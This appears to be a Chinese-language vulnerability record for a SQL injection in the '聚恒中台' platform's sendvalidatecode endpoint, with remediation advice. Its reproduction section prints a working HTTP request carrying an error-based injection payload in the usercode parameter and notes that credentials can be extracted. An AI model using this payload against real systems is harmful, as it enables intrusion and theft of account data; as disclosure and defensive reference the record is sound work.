---
schema_version: "1"
id: "VW-20261012-CG005"
title: "聚恒中台 sendvalidatecode SQL注入漏洞"
product: "聚恒中台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "active"
prerequisites: "可访问 /sysplat/dataget/data.ashx"
side_effects: "SQL 注入可致数据泄露；测试须限定授权环境"
source: "公开 PoC 与安全研究"
source_status: "recorded"
source_url: "https://github.com/gelusus/wxvl"
---

# 聚恒中台 sendvalidatecode SQL注入漏洞

## 漏洞描述

聚恒中台 `/sysplat/dataget/data.ashx?type=sendvalidatecode` 接口存在 SQL 注入漏洞。攻击者通过 `usercode` 参数构造报错注入语句，可提取数据库敏感信息。

## 漏洞复现

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc1.png)

```
POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
Host: target
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 53
Content-Type: application/x-www-form-urlencoded

usercode=1' and 1=(convert(int,@@version))--&mobile=
```

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc2.png)

响应中通过 SQL Server 报错回显数据库版本信息，确认注入成功。可进一步构造报错注入语句逐字段提取管理员账号、密码哈希等敏感数据。

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc3.png)

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc4.png)

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc5.png)

![](./.resource/聚恒中台-sendvalidatecode-SQL注入漏洞/media/poc6.png)

## 漏洞修复

1. 对 `usercode` 等参数使用预编译语句，禁止字符串拼接 SQL；
2. 关闭详细报错回显，升级至安全版本。

> 仅限授权测试。
